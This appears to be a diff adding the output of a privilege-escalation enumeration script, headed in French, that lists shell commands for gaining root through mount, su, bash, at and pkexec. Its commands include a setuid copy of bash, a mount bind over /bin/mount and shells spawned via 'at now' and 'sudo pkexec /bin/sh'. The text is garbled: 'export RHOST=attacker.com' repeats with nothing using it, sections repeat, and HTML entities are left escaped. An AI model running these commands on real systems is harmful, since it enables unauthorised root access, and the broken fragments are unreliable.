@@ -1,0 +1,42 @@
+Les potentielles élévations de privilège sont les suivantes : 
+mount
+        sudo mount -o bind /bin/sh /bin/mount
+mount +  #############################################
+su
+        sudo su
+su +  #############################################
+bash
+        bash
+        export RHOST=attacker.com
+        export RHOST=attacker.com
+        export RHOST=attacker.com
+        export RHOST=attacker.com
+        export RHOST=attacker.com
+        export LFILE=file_to_write
+        LFILE=file_to_write
+        export LFILE=file_to_read
+        LFILE=file_to_read
+        bash -c &#39;enable -f ./lib.so x&#39;
+        sudo install -m =xs $(which bash) .
+        sudo bash
+bash +  #############################################
+mount
+        sudo mount -o bind /bin/sh /bin/mount
+mount +  #############################################
+su
+        sudo su
+su +  #############################################
+mount
+        sudo mount -o bind /bin/sh /bin/mount
+mount +  #############################################
+su
+        sudo su
+su +  #############################################
+at
+        echo &quot;/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&quot; | at now; tail -f /dev/null
+        COMMAND=id
+        echo &quot;/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&quot; | sudo at now; tail -f /dev/null
+at +  #############################################
+pkexec
+        sudo pkexec /bin/sh
+pkexec +  #############################################
